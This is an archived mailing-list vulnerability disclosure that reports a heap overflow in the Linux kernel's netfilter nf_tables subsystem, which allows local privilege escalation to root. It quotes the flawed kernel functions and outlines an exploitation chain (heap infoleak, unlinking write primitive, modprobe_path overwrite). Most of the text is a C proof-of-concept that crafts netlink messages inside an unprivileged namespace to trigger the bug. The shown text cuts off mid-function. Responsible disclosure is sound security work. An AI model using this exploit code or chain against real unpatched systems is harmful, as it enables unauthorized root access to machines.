<html><head><title>[vs] Netfilter vulnerability disclosure</title><link
rel=alternate
title="Atom feed"
href="../../new.atom"
type="application/atom+xml"/><style>pre{white-space:pre-wrap}*{font-size:100%;font-family:monospace}</style><link
type=text/css
rel=stylesheet
href=../../216light.css?66c655cb
media=screen,print /><link
type=text/css
rel=stylesheet
media="screen and (prefers-color-scheme:dark)"
href=../../216dark.css?66c655cb /></head><body><form
action="../../"><pre><a
href="../../?t=20220701154326"><b>netfilter-devel.vger.kernel.org archive mirror</b></a>
<input
name=q
type=text /><input
type=submit
value=search /> <a
href="../../_/text/help/">help</a> / <a
href="../../_/text/color/">color</a> / <a
id=mirror
href="../../_/text/mirror/">mirror</a> / <a
href="../../new.atom">Atom feed</a></pre></form><pre><a
href=#ea10c0f58da9851b3f353b126fe8e3f85c7dbef07
id=ma10c0f58da9851b3f353b126fe8e3f85c7dbef07>*</a> <u
id=u><b>[vs] Netfilter vulnerability disclosure</b></u>
<b>@ 2022-07-01 15:43 Hugues ANGUELKOV</b>
  <a
href=#ra10c0f58da9851b3f353b126fe8e3f85c7dbef07>0 siblings, 0 replies; only message in thread</a>
From: Hugues ANGUELKOV @ 2022-07-01 15:43 UTC (<a
href="../../cd9428b6-7ffb-dd22-d949-d86f4869f452@randorisec.fr/">permalink</a> / <a
href="../../cd9428b6-7ffb-dd22-d949-d86f4869f452@randorisec.fr/raw">raw</a>)
  To: linux-distros
  Cc: security, pablo, kadlec, fw, <a
href="../../../netfilter-devel/?t=20220701154326">netfilter-devel</a>, coreteam, davy,
	amongodin

Hello everyone,

One of our collaborators at RandoriSec, Arthur Mongodin found a 
vulnerability within the netfilter subsystem during his internship.
Successful exploitation of this bug leads to a Local Privilege 
Escalation (LPE) to the `root` user, as tested on Ubuntu server 22.04 
(Linux 5.15.0-39-generic).
This vulnerability is a heap buffer overflow due to a weak check and has 
been introduced within the commit 
[fdb9c405e35bdc6e305b9b4e20ebc141ed14fc81](<a
href="https://github.com/torvalds/linux/commit/fdb9c405e35bdc6e305b9b4e20ebc141ed14fc81">https://github.com/torvalds/linux/commit/fdb9c405e35bdc6e305b9b4e20ebc141ed14fc81</a>), 
it affects the Linux kernel since the version 5.8 and is still present 
today.

The heap buffer overflow happens in the function `nft_set_elem_init` 
(`/net/netfilter/nf_tables_api.c`)

```c
void *nft_set_elem_init(const struct nft_set *set,
 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; const struct nft_set_ext_tmpl *tmpl,
 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; const u32 *key, const u32 *key_end,
 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; const u32 *data, u64 timeout, u64 expiration, gfp_t gfp)
{
 &#160;&#160;&#160; struct nft_set_ext *ext;
 &#160;&#160;&#160; void *elem;

 &#160;&#160;&#160; elem = kzalloc(set-&gt;ops-&gt;elemsize + tmpl-&gt;len, 
gfp);&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; &lt;===== (0)
 &#160;&#160;&#160; if (elem == NULL)
 &#160;&#160;&#160;&#160;&#160;&#160;&#160; return NULL;

 &#160;&#160;&#160; ...

 &#160;&#160;&#160; if (nft_set_ext_exists(ext, NFT_SET_EXT_DATA))
 &#160;&#160;&#160;&#160;&#160;&#160;&#160; memcpy(nft_set_ext_data(ext), data, 
set-&gt;dlen);&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; &lt;===== (1)

 &#160;&#160;&#160; ...

 &#160;&#160;&#160; return elem;
}
```

A buffer is allocated at (0) without taking in consideration the value 
`set-&gt;dlen` used at (1) for the copy.
The computation of the needed space (`tmpl-&gt;len`) is realized before the 
call to `nft_set_elem_init`, however,
 &#160;a weak check on a user input allows a user to provide an element with 
a data length lower than the `set-&gt;dlen` for the allocation.
This check is located within the function `nft_set_elem_parse_data` 
(`/net/netfilter/nf_tables_api.c`).

```c
static int nft_setelem_parse_data(struct nft_ctx *ctx, struct nft_set *set,
 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; struct nft_data_desc *desc,
 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; struct nft_data *data,
 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; struct nlattr *attr)
{

 &#160;&#160;&#160; ...

 &#160;&#160;&#160; if (desc-&gt;type != NFT_DATA_VERDICT &#38;&#38; desc-&gt;len != set-&gt;dlen) 
{&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; &lt;===== (2)
 &#160;&#160;&#160;&#160;&#160;&#160;&#160; nft_data_release(data, desc-&gt;type);
 &#160;&#160;&#160;&#160;&#160;&#160;&#160; return -EINVAL;
 &#160;&#160;&#160; }

 &#160;&#160;&#160; return 0;
}
```

As we can see at (2), if the data type is `NFT_DATA_VERDICT`, the 
comparison between `desc-&gt;len` and `set-&gt;dlen` is not done.
Finally, `desc-&gt;len` it is used to compute `tmpl-&gt;len` at (0) and 
`set-&gt;dlen` for the copy at (1) and they can be different.

The vulnerable code path can be reached if the kernel is built with the 
configuration `CONFIG_NETFILTER`, `CONFIG_NF_TABLES` enabled.
To exploit the vulnerability, an attacker may need to obtain an 
unprivileged user namespace to gain the capability `CAP_NET_ADMIN` 
(`CONFIG_USER_NS` and `CONFIG_NET_NS` enabled, and 
`kernel.unprivileged_userns_clone = 1`).


The exploitation was simplified by the use of an uninitialized variable 
in `nft_add_set_elem`:

```c
static int nft_add_set_elem(struct nft_ctx *ctx, struct nft_set *set, 
const struct nlattr *attr, u32 nlmsg_flags)
{
 &#160; struct nft_set_elem elem;
 &#160; ...
}
```

First we add an `elem` with the type `NFT_DATA_VALUE`, then `elem.data` 
will be filled `set-&gt;dlen` bytes, the second iteration will only erase 
the first bytes of `elem.data` with an element of type `NFT_DATA_VERDICT`.

We get an infoleak by overwriting the field `datalen` of 
an`user_key_payload` structure. The write primitive can be obtained with 
an unlinking attack on the `list_head` of the `simple_xattr` structure.
We targeted the `modprobe_path` to gain root permission by executing a 
shell wrapper.

The following Proof of Concept (PoC) will trigger KASAN on the upstream 
kernel (Linux 5.19.0-rc4)

```c
#define _GNU_SOURCE
#include &lt;stdio.h&gt;
#include &lt;sched.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;stdint.h&gt;
#include &lt;string.h&gt;
#include &lt;unistd.h&gt;
#include &lt;limits.h&gt;
#include &lt;arpa/inet.h&gt;
#include &lt;sys/xattr.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;linux/netlink.h&gt;
#include &lt;linux/netfilter.h&gt;
#include &lt;linux/netfilter/nfnetlink.h&gt;
#include &lt;linux/netfilter/nf_tables.h&gt;

#define do_error_exit(msg) do {perror(&#34;[-] &#34; msg); exit(EXIT_FAILURE); } 
while(0)

#define ID 1337
#define SET_NAME &#34;name\0\0\0&#34;
#define LEAK_SET_NAME &#34;leak\0\0\0&#34;
#define TABLE &#34;table\0\0&#34;

#define U32_NLA_SIZE (sizeof(struct nlattr) + sizeof(uint32_t))
#define U64_NLA_SIZE (sizeof(struct nlattr) + sizeof(uint64_t))
#define S8_NLA_SIZE (sizeof(struct nlattr) + 8)
#define NLA_BIN_SIZE(x) (sizeof(struct nlattr) + x)
#define NLA_ATTR(attr) ((void *)attr + NLA_HDRLEN)

#define TABLEMSG_SIZE NLMSG_SPACE(sizeof(struct nfgenmsg) + 
sizeof(struct nlattr) + 8)

#define KMALLOC64_KEYLEN (64 - 8 - 12 - 16) // Max size - elemsize - 
sizeof(nft_set_ext)(align) - min datasize

#define BUFFER_SIZE 64

uint8_t buffer[BUFFER_SIZE] = {0};

void new_ns(void) {

 &#160;&#160;&#160; if (unshare(CLONE_NEWUSER))
 &#160;&#160;&#160;&#160;&#160;&#160;&#160; do_error_exit(&#34;unshare(CLONE_NEWUSER)&#34;);

 &#160;&#160;&#160; if (unshare(CLONE_NEWNET))
 &#160;&#160;&#160;&#160;&#160;&#160;&#160; do_error_exit(&#34;unshare(CLONE_NEWNET)&#34;);
}

struct nlmsghdr *get_batch_begin_nlmsg(void) {

 &#160;&#160;&#160; struct nlmsghdr *nlh = (struct nlmsghdr 
*)malloc(NLMSG_SPACE(sizeof(struct nfgenmsg)));
 &#160;&#160;&#160; struct nfgenmsg *nfgm = (struct nfgenmsg *)NLMSG_DATA(nlh);

 &#160;&#160;&#160; if (!nlh)
 &#160;&#160;&#160;&#160;&#160;&#160;&#160; do_error_exit(&#34;malloc&#34;);

 &#160;&#160;&#160; memset(nlh, 0, NLMSG_SPACE(sizeof(struct nfgenmsg)));
 &#160;&#160;&#160; nlh-&gt;nlmsg_len = NLMSG_SPACE(sizeof(struct nfgenmsg));
 &#160;&#160;&#160; nlh-&gt;nlmsg_type = NFNL_MSG_BATCH_BEGIN;
 &#160;&#160;&#160; nlh-&gt;nlmsg_pid = getpid();
 &#160;&#160;&#160; nlh-&gt;nlmsg_flags = 0;
 &#160;&#160;&#160; nlh-&gt;nlmsg_seq = 0;

 &#160;&#160;&#160; /* Used to access to the netfilter tables subsystem */
 &#160;&#160;&#160; nfgm-&gt;res_id = NFNL_SUBSYS_NFTABLES;

 &#160;&#160;&#160; return nlh;
}

struct nlmsghdr *get_batch_end_nlmsg(void) {

 &#160;&#160;&#160; struct nlmsghdr *nlh = (struct nlmsghdr 
*)malloc(NLMSG_SPACE(sizeof(struct nfgenmsg)));

 &#160;&#160;&#160; if (!nlh)
 &#160;&#160;&#160;&#160;&#160;&#160;&#160; do_error_exit(&#34;malloc&#34;);

 &#160;&#160;&#160; memset(nlh, 0, NLMSG_SPACE(sizeof(struct nfgenmsg)));
 &#160;&#160;&#160; nlh-&gt;nlmsg_len = NLMSG_SPACE(sizeof(struct nfgenmsg));
 &#160;&#160;&#160; nlh-&gt;nlmsg_type = NFNL_MSG_BATCH_END;
 &#160;&#160;&#160; nlh-&gt;nlmsg_pid = getpid();
 &#160;&#160;&#160; nlh-&gt;nlmsg_flags = NLM_F_REQUEST;
 &#160;&#160;&#160; nlh-&gt;nlmsg_seq = 0;

 &#160;&#160;&#160; return nlh;
}

struct nlattr *set_nested_attr(struct nlattr *attr, uint16_t type, 
uint16_t data_len) {
 &#160;&#160;&#160; attr-&gt;nla_type = type;
 &#160;&#160;&#160; attr-&gt;nla_len = NLA_ALIGN(data_len + sizeof(struct nlattr));
 &#160;&#160;&#160; return (void *)attr + sizeof(struct nlattr);
}

struct nlattr *set_u32_attr(struct nlattr *attr, uint16_t type, uint32_t 
value) {
 &#160;&#160;&#160; attr-&gt;nla_type = type;
 &#160;&#160;&#160; attr-&gt;nla_len = U32_NLA_SIZE;
 &#160;&#160;&#160; *(uint32_t *)NLA_ATTR(attr) = htonl(value);

 &#160;&#160;&#160; return (void *)attr + U32_NLA_SIZE;
}

struct nlattr *set_str8_attr(struct nlattr *attr, uint16_t type, const 
char name[8]) {
 &#160;&#160;&#160; attr-&gt;nla_type = type;
 &#160;&#160;&#160; attr-&gt;nla_len = S8_NLA_SIZE;
 &#160;&#160;&#160; memcpy(NLA_ATTR(attr), name, 8);

 &#160;&#160;&#160; return (void *)attr + S8_NLA_SIZE;
}

struct nlattr *set_binary_attr(struct nlattr *attr, uint16_t type, 
uint8_t *buffer, uint64_t buffer_size) {
 &#160;&#160;&#160; attr-&gt;nla_type = type;
 &#160;&#160;&#160; attr-&gt;nla_len = NLA_BIN_SIZE(buffer_size);
 &#160;&#160;&#160; memcpy(NLA_ATTR(attr), buffer, buffer_size);

 &#160;&#160;&#160; return (void *)attr + NLA_ALIGN(NLA_BIN_SIZE(buffer_size));
}
void create_table(int sock, const char *name) {
 &#160;&#160;&#160; struct msghdr msg;
 &#160;&#160;&#160; struct sockaddr_nl dest_snl;
 &#160;&#160;&#160; struct iovec iov[3];
 &#160;&#160;&#160; struct nlmsghdr *nlh_batch_begin;
 &#160;&#160;&#160; struct nlmsghdr *nlh;
 &#160;&#160;&#160; struct nlmsghdr *nlh_batch_end;
 &#160;&#160;&#160; struct nlattr *attr;
 &#160;&#160;&#160; struct nfgenmsg *nfm;

 &#160;&#160;&#160; /* Destination preparation */
 &#160;&#160;&#160; memset(&#38;dest_snl, 0, sizeof(dest_snl));
 &#160;&#160;&#160; dest_snl.nl_family = AF_NETLINK;
 &#160;&#160;&#160; memset(&#38;msg, 0, sizeof(msg));

 &#160;&#160;&#160; /* Netlink batch_begin message preparation */
 &#160;&#160;&#160; nlh_batch_begin = get_batch_begin_nlmsg();

 &#160;&#160;&#160; /* Netlink table message preparation */
 &#160;&#160;&#160; nlh = (struct nlmsghdr *)malloc(TABLEMSG_SIZE);
 &#160;&#160;&#160; if (!nlh)
 &#160;&#160;&#160;&#160;&#160;&#160;&#160; do_error_exit(&#34;malloc&#34;);

 &#160;&#160;&#160; memset(nlh, 0, TABLEMSG_SIZE);
 &#160;&#160;&#160; nlh-&gt;nlmsg_len = TABLEMSG_SIZE;
 &#160;&#160;&#160; nlh-&gt;nlmsg_type = (NFNL_SUBSYS_NFTABLES &lt;&lt; 8) | NFT_MSG_NEWTABLE;
 &#160;&#160;&#160; nlh-&gt;nlmsg_pid = getpid();
 &#160;&#160;&#160; nlh-&gt;nlmsg_flags = NLM_F_REQUEST;
 &#160;&#160;&#160; nlh-&gt;nlmsg_seq = 0;

 &#160;&#160;&#160; nfm = NLMSG_DATA(nlh);
 &#160;&#160;&#160; nfm-&gt;nfgen_family = NFPROTO_INET;

 &#160;&#160;&#160; /** Prepare associated attribute **/
 &#160;&#160;&#160; attr = (void *)nlh + NLMSG_SPACE(sizeof(struct nfgenmsg));
 &#160;&#160;&#160; set_str8_attr(attr, NFTA_TABLE_NAME, name);

 &#160;&#160;&#160; /* Netlink batch_end message preparation */
 &#160;&#160;&#160; nlh_batch_end = get_batch_end_nlmsg();

 &#160;&#160;&#160; /* IOV preparation */
 &#160;&#160;&#160; memset(iov, 0, sizeof(struct iovec) * 3);
 &#160;&#160;&#160; iov[0].iov_base = (void *)nlh_batch_begin;
 &#160;&#160;&#160; iov[0].iov_len = nlh_batch_begin-&gt;nlmsg_len;
 &#160;&#160;&#160; iov[1].iov_base = (void *)nlh;
 &#160;&#160;&#160; iov[1].iov_len = nlh-&gt;nlmsg_len;
 &#160;&#160;&#160; iov[2].iov_base = (void *)nlh_batch_end;
 &#160;&#160;&#160; iov[2].iov_len = nlh_batch_end-&gt;nlmsg_len;

 &#160;&#160;&#160; /* Message header preparation */
 &#160;&#160;&#160; msg.msg_name = (void *)&#38;dest_snl;
 &#160;&#160;&#160; msg.msg_namelen = sizeof(struct sockaddr_nl);
 &#160;&#160;&#160; msg.msg_iov = iov;
 &#160;&#160;&#160; msg.msg_iovlen = 3;

 &#160;&#160;&#160; sendmsg(sock, &#38;msg, 0);

 &#160;&#160;&#160; /* Free used structures */
 &#160;&#160;&#160; free(nlh_batch_end);
 &#160;&#160;&#160; free(nlh);
 &#160;&#160;&#160; free(nlh_batch_begin);
}

void create_set(int sock, const char *set_name, uint32_t set_keylen, 
uint32_t data_len, const char *table_name, uint32_t id) {
 &#160;&#160;&#160; struct msghdr msg;
 &#160;&#160;&#160; struct sockaddr_nl dest_snl;
 &#160;&#160;&#160; struct nlmsghdr *nlh_batch_begin;
 &#160;&#160;&#160; struct nlmsghdr *nlh_payload;
 &#160;&#160;&#160; struct nlmsghdr *nlh_batch_end;
 &#160;&#160;&#160; struct nfgenmsg *nfm;
 &#160;&#160;&#160; struct nlattr *attr;
 &#160;&#160;&#160; uint64_t nlh_payload_size;
 &#160;&#160;&#160; struct iovec iov[3];

 &#160;&#160;&#160; /* Prepare the netlink sockaddr for msg */
 &#160;&#160;&#160; memset(&#38;dest_snl, 0, sizeof(struct sockaddr_nl));
 &#160;&#160;&#160; dest_snl.nl_family = AF_NETLINK;

 &#160;&#160;&#160; /* First netlink message: batch_begin */
 &#160;&#160;&#160; nlh_batch_begin = get_batch_begin_nlmsg();

 &#160;&#160;&#160; /* Second netlink message : Set attributes */
 &#160;&#160;&#160; nlh_payload_size = sizeof(struct 
nfgenmsg);&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; // Mandatory
 &#160;&#160;&#160; nlh_payload_size += 
S8_NLA_SIZE;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; // 
NFTA_SET_TABLE
 &#160;&#160;&#160; nlh_payload_size += 
S8_NLA_SIZE;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; // NFTA_SET_NAME
 &#160;&#160;&#160; nlh_payload_size += 
U32_NLA_SIZE;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; // NFTA_SET_ID
 &#160;&#160;&#160; nlh_payload_size += 
U32_NLA_SIZE;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; // 
NFTA_SET_KEY_LEN
 &#160;&#160;&#160; nlh_payload_size += 
U32_NLA_SIZE;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; // 
NFTA_SET_FLAGS
 &#160;&#160;&#160; nlh_payload_size += 
U32_NLA_SIZE;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; // 
NFTA_SET_DATA_TYPE
 &#160;&#160;&#160; nlh_payload_size += 
U32_NLA_SIZE;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; // 
NFTA_SET_DATA_LEN
 &#160;&#160;&#160; nlh_payload_size = NLMSG_SPACE(nlh_payload_size);

 &#160;&#160;&#160; /** Allocation **/
 &#160;&#160;&#160; nlh_payload = (struct nlmsghdr *)malloc(nlh_payload_size);
 &#160;&#160;&#160; if (!nlh_payload)
 &#160;&#160;&#160;&#160;&#160;&#160;&#160; do_error_exit(&#34;malloc&#34;);

 &#160;&#160;&#160; memset(nlh_payload, 0, nlh_payload_size);

 &#160;&#160;&#160; /** Fill the required fields **/
 &#160;&#160;&#160; nlh_payload-&gt;nlmsg_len = nlh_payload_size;
 &#160;&#160;&#160; nlh_payload-&gt;nlmsg_type = (NFNL_SUBSYS_NFTABLES &lt;&lt; 8) | NFT_MSG_NEWSET;
 &#160;&#160;&#160; nlh_payload-&gt;nlmsg_pid = getpid();
 &#160;&#160;&#160; nlh_payload-&gt;nlmsg_flags = NLM_F_REQUEST | NLM_F_CREATE;
 &#160;&#160;&#160; nlh_payload-&gt;nlmsg_seq = 0;


 &#160;&#160;&#160; /** Setup the nfgenmsg **/
 &#160;&#160;&#160; nfm = (struct nfgenmsg *)NLMSG_DATA(nlh_payload);
 &#160;&#160;&#160; nfm-&gt;nfgen_family = 
NFPROTO_INET;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; // Verify if 
it is compulsory

 &#160;&#160;&#160; /** Setup the attributes */
 &#160;&#160;&#160; attr = (struct nlattr *)((void *)nlh_payload + 
NLMSG_SPACE(sizeof(struct nfgenmsg)));
 &#160;&#160;&#160; attr = set_str8_attr(attr, NFTA_SET_TABLE, table_name);
 &#160;&#160;&#160; attr = set_str8_attr(attr, NFTA_SET_NAME, set_name);
 &#160;&#160;&#160; attr = set_u32_attr(attr, NFTA_SET_ID, id);
 &#160;&#160;&#160; attr = set_u32_attr(attr, NFTA_SET_KEY_LEN, set_keylen);
 &#160;&#160;&#160; attr = set_u32_attr(attr, NFTA_SET_FLAGS, NFT_SET_MAP);
 &#160;&#160;&#160; attr = set_u32_attr(attr, NFTA_SET_DATA_TYPE, 0);
 &#160;&#160;&#160; set_u32_attr(attr, NFTA_SET_DATA_LEN, data_len);

 &#160;&#160;&#160; /* Last netlink message: batch_end */
 &#160;&#160;&#160; nlh_batch_end = get_batch_end_nlmsg();

 &#160;&#160;&#160; /* Setup the iovec */
 &#160;&#160;&#160; memset(iov, 0, sizeof(struct iovec) * 3);
 &#160;&#160;&#160; iov[0].iov_base = (void *)nlh_batch_begin;
 &#160;&#160;&#160; iov[0].iov_len = nlh_batch_begin-&gt;nlmsg_len;
 &#160;&#160;&#160; iov[1].iov_base = (void *)nlh_payload;
 &#160;&#160;&#160; iov[1].iov_len = nlh_payload-&gt;nlmsg_len;
 &#160;&#160;&#160; iov[2].iov_base = (void *)nlh_batch_end;
 &#160;&#160;&#160; iov[2].iov_len = nlh_batch_end-&gt;nlmsg_len;

 &#160;&#160;&#160; /* Prepare the message to send */
 &#160;&#160;&#160; memset(&#38;msg, 0, sizeof(struct msghdr));
 &#160;&#160;&#160; msg.msg_name = (void *)&#38;dest_snl;
 &#160;&#160;&#160; msg.msg_namelen = sizeof(struct sockaddr_nl);
 &#160;&#160;&#160; msg.msg_iov = iov;
 &#160;&#160;&#160; msg.msg_iovlen = 3;

 &#160;&#160;&#160; /* Send message */
 &#160;&#160;&#160; sendmsg(sock, &#38;msg, 0);

 &#160;&#160;&#160; /* Free allocated memory */
 &#160;&#160;&#160; free(nlh_batch_end);
 &#160;&#160;&#160; free(nlh_payload);
 &#160;&#160;&#160; free(nlh_batch_begin);
}

void add_elem_to_set(int sock, const char *set_name, uint32_t 
set_keylen, const char *table_name, uint32_t id, uint32_t data_len, 
uint8_t *data) {
 &#160;&#160;&#160; struct msghdr msg;
 &#160;&#160;&#160; struct sockaddr_nl dest_snl;
 &#160;&#160;&#160; struct nlmsghdr *nlh_batch_begin;
 &#160;&#160;&#160; struct nlmsghdr *nlh_payload;
 &#160;&#160;&#160; struct nlmsghdr *nlh_batch_end;
 &#160;&#160;&#160; struct nfgenmsg *nfm;
 &#160;&#160;&#160; struct nlattr *attr;
 &#160;&#160;&#160; uint64_t nlh_payload_size;
 &#160;&#160;&#160; uint64_t nested_attr_size;
 &#160;&#160;&#160; struct iovec iov[3];

 &#160;&#160;&#160; /* Prepare the netlink sockaddr for msg */
 &#160;&#160;&#160; memset(&#38;dest_snl, 0, sizeof(struct sockaddr_nl));
 &#160;&#160;&#160; dest_snl.nl_family = AF_NETLINK;

 &#160;&#160;&#160; /* First netlink message: batch */
 &#160;&#160;&#160; nlh_batch_begin = get_batch_begin_nlmsg();

 &#160;&#160;&#160; /* Second netlink message : Set attributes */

 &#160;&#160;&#160; /** Precompute the size of the nested field **/
 &#160;&#160;&#160; nested_attr_size = 0;

 &#160;&#160;&#160; nested_attr_size += sizeof(struct 
nlattr);&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; // Englobing attribute
 &#160;&#160;&#160; nested_attr_size += sizeof(struct 
nlattr);&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; // NFTA_SET_ELEM_KEY
 &#160;&#160;&#160; nested_attr_size += 
NLA_BIN_SIZE(set_keylen);&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; // 
NFTA_DATA_VALUE
 &#160;&#160;&#160; nested_attr_size += sizeof(struct 
nlattr);&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; // NFTA_SET_ELEM_DATA
 &#160;&#160;&#160; nested_attr_size += sizeof(struct 
nlattr);&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; // NFTA_DATA_VERDICT
 &#160;&#160;&#160; nested_attr_size += 
U32_NLA_SIZE;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; // 
NFTA_VERDICT_CODE

 &#160;&#160;&#160; nlh_payload_size = sizeof(struct 
nfgenmsg);&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; // Mandatory
 &#160;&#160;&#160; nlh_payload_size += sizeof(struct 
nlattr);&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; // NFTA_SET_ELEM_LIST_ELEMENTS
 &#160;&#160;&#160; nlh_payload_size += 
nested_attr_size;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; // All the 
stuff described above
 &#160;&#160;&#160; nlh_payload_size += 
S8_NLA_SIZE;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; // 
NFTA_SET_ELEM_LIST_TABLE
 &#160;&#160;&#160; nlh_payload_size += 
S8_NLA_SIZE;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; // 
